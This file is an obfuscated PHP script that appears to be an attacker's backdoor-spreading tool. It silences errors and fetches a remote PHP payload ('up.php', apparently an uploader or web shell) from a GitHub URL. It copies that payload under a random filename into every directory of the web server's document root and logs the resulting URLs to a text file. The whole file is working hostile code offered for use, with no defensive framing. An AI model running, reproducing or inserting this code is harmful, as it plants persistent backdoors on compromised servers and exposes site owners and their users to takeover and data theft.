<?php
error_reporting(0);

$u0="DOCUMENT_ROOT";$p0=$_SERVER[$u0];
$u1=(isset($_SERVER['HTTPS'])?"https://":"http://").$_SERVER['HTTP_HOST'];
$p1="https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/maw-gen/up.php";
$p2="maw3six-".substr(md5(time()),0,8).".txt";

function x0($x1=6){return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"),0,$x1).".php";}

function x1($x2){
    $x3=curl_init();
    curl_setopt($x3,CURLOPT_URL,$x2);
    curl_setopt($x3,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($x3,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($x3,CURLOPT_FOLLOWLOCATION,true);
    curl_setopt($x3,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
    $x4=curl_exec($x3);
    curl_close($x3);
    return $x4;
}

function x5($d0,$d1,$d2,$d3){
    if(!is_dir($d0)){echo"[X] $d0\n";return;}
    $d4=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d0,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
    $d5=[];$d6=x1($d1);
    if($d6===false||empty($d6)){echo"[X] Gagal Load\n";return;}
    foreach($d4 as $d7){
        if($d7->isDir()){
            $d8=$d7->getPathname()."/".x0();
            $d9=str_replace($_SERVER['DOCUMENT_ROOT'],'',$d8);
            $e0=rtrim($d2,'/').'/'.ltrim($d9,'/');
            if(file_put_contents($d8,$d6)!==false){
                echo"[✔] $e0\n";$d5[]="[✔] $e0";
            }else{
                echo"[X] $e0\n";$d5[]="[X] $e0";
            }
        }
    }
    if(!empty($d5)){file_put_contents($d3,implode("\n",$d5)."\n",FILE_APPEND);}
}

x5($p0,$p1,$u1,$p2);
?>
